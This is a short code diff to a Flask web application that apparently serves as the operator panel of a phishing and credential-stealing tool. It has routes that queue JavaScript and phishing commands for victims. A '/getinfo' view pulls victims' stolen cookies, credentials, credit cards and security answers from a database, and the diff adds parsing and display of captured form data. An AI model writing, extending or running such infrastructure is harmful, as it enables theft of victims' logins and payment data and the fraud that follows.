@@ -77,7 +77,7 @@ def sendjs():
     z = request.form['pattern']
     c = a + '\n' + b + '\n' + z
     database.add_js_cmd(b, z, a)
-
+    return c
 
 @app_flask.route('/phish', methods=['POST'])
 @login_required
@@ -87,7 +87,7 @@ def phish():
     y = request.form['pattern']
     f = d + '\n' + e + '\n' + y
     database.add_phish_cmd(d, y, e)
-
+    return f
 
 @app_flask.route('/getinfo', methods=['POST'])
 @login_required
@@ -106,9 +106,18 @@ def getinfo():
         creditcards = cur.fetchall()
         cur.execute('SELECT * FROM SecurityQuestions WHERE CID = (%s)', (userid,))
         questions = cur.fetchall()
+        cur.execute('SELECT * FROM ComplexForms WHERE CID = (%s)', (userid,))
+        forms = cur.fetchall()
+
         conn.close()
 
-    # head = "url1\nurl2\nurl3\nurl4\nurl5\nurl6\nurl7\nurl8\nurl9\nurl10"
+    forms = [i[1][1:-1] for i in forms]
+    forms = [i.split(', ') for i in forms]
+    j=0
+    for i in forms:
+        forms[j] = [data.split(':') for data in i]
+        j=j+1
+        # head = "url1\nurl2\nurl3\nurl4\nurl5\nurl6\nurl7\nurl8\nurl9\nurl10"
     # sites = head.split('\n')
     sites_in_html = []
     # for x in sites:
@@ -119,7 +128,7 @@ def getinfo():
     #     head = [next(bh) for x in range(10)]
 
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
-                           creditcards=creditcards, questions=questions, history = sites_in_html, fullbh = fullbh)
+                           creditcards=creditcards, questions=questions, history = sites_in_html, fullbh = fullbh, forms = forms)
 
 #
 # def update_payload(id, text):
